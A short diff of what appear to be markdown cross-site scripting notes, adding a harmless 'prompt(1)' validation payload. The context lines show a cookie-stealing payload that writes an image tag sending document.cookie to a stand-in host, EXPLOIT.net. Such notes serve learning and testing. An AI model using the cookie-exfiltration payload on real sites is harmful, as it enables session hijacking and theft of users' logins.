@@ -221,3 +221,9 @@ document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
 ```
 document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
 ```
+
+>Prompt Validation payload, does not steal cookie or send it to exploit server.  
+
+```html
+<img src=x onerror=prompt(1)>
+```  
